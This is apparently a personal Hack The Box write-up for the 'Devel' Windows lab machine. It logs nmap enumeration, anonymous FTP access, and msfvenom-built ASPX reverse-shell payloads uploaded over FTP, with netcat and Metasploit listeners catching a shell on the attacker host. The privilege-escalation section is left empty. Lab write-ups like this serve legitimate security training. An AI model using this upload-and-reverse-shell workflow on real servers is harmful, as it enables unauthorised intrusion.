---
date: 2024-09-30
title: Devel HTB Write-Up
machine_ip: 10.10.10.5
os: Windows
difficulty: Easy
my_rating: 
tags:
  - Windows
  - PrivEsc
references: "[[📦HTB Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -sVC 10.10.10.5       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 18:22 PDT
Nmap scan report for 10.10.10.5
Host is up (0.14s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds

```
- FTP
```
┌──(root㉿kali)-[~]
└─# ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -R
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> get aspnet_client
local: aspnet_client remote: aspnet_client
229 Entering Extended Passive Mode (|||49162|)
550 Access is denied. 
ftp> get iisstart.htm
local: iisstart.htm remote: iisstart.htm
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   689        6.87 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (6.86 KiB/s)
ftp> get welcome.png
local: welcome.png remote: welcome.png
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   180 KiB  230.45 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 820 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
184946 bytes received in 00:00 (230.40 KiB/s)
ftp> 

```

- Banner
```
msf6 auxiliary(dos/windows/ftp/iis75_ftpd_iac_bof) > run
[*] Running module against 10.10.10.5

[*] 10.10.10.5:21 - banner: 220 Microsoft FTP Service
[*] Auxiliary module execution completed
```

# Foothold
- `msf6 post(multi/recon/local_exploit_suggester)`

msfvenom aspx payload
```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx >shell.aspx  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2703 bytes
```

PUT shell.aspx
```
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  2741       51.25 MiB/s    --:-- ETA
226 Transfer complete.
2741 bytes sent in 00:00 (19.37 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49182|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
10-01-24  04:45AM                38273 reverse.asp
10-01-24  05:02AM                 2924 reverse.aspx
10-01-24  05:06AM                 2741 shell.aspx
10-01-24  04:38AM       <DIR>          UNQUVKEJED
10-01-24  04:36AM       <DIR>          WCGHGYAMXC
03-17-17  05:37PM               184946 welcome.png
10-01-24  04:37AM       <DIR>          XVZYNXRIWM
226 Transfer complete.
```

Catch shell
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 1337                                                                        
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49183
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

msfconsole way:
```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx >exploit.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2891 bytes
```

```
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Run meterpreter listener and navigate to shell in url
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.5:49186) at 2024-09-30 19:12:47 -0700

meterpreter > getuid
Server username: IIS APPPOOL\Web
```




# PrivEsc
- escalate from user to root